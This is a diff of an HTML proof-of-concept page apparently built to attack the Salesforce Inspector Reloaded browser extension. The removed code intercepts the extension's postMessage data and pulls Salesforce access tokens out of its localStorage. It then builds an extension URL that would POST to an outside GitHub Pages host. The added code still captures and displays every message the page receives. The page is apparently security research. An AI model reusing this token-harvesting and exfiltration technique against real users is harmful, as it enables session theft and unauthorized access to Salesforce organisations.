@@ -4,54 +4,14 @@
     <title>SFDC Inspector Reloaded</title>
     <style>
         body { font-family: system-ui; max-width: 800px; margin: 20px auto; padding: 20px; }
-        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; margin-bottom: 20px; }
-        pre { margin: 10px 0; white-space: pre-wrap; }
-        .token { color: #2e7d32; }
-        .message { color: #1976d2; }
-        #urlDisplay { 
-            margin-top: 20px;
-            padding: 15px;
-            background: #e3f2fd;
-            border-radius: 4px;
-        }
+        #messages { background: #f5f5f5; padding: 15px; border-radius: 4px; }
     </style>
 </head>
 <body>
-    <div id="messages"></div>
-    <div id="urlDisplay"></div>
+    <div id="messages">Loading...</div>
     <script>
-        function displayMessage(label, msg) {
-            const pre = document.createElement('pre');
-            pre.textContent = `${label}:\n${typeof msg === 'object' ? JSON.stringify(msg, null, 2) : msg}`;
-            pre.className = label.includes('Token') ? 'token' : 'message';
-            document.getElementById('messages').appendChild(pre);
-        }
-
         window.addEventListener('message', function(event) {
-            if (event.data.insextInitRequest) {
-                displayMessage('Init Request', event.data);
-                
-                const storage = event.data.iFrameLocalStorage;
-                // Display access tokens
-                for (let host in storage) {
-                    if (storage[host].includes('access_token')) {
-                        displayMessage('Access Token Found', `Host: ${host}\nStorage: ${storage[host]}`);
-                    }
-                }
-                
-                // Get first host and construct URL (but don't navigate to it)
-                const firstHost = Object.keys(storage)[0];
-                if (firstHost) {
-                    const url = `chrome-extension://apfebnafilpofmbeebponacgbdhnkmnl/rest-explore.html?host=${firstHost}&method=POST&endpoint=samanattar.github.io`;
-                    
-                    // Display the URL instead of navigating to it
-                    const urlDiv = document.getElementById('urlDisplay');
-                    urlDiv.innerHTML = `
-                        <h3>Constructed URL:</h3>
-                        <pre>${url}</pre>
-                    `;
-                }
-            }
+            document.getElementById('messages').textContent = 'Got message: ' + JSON.stringify(event.data, null, 2);
         });
 
         // Initial iframe for getting localStorage data
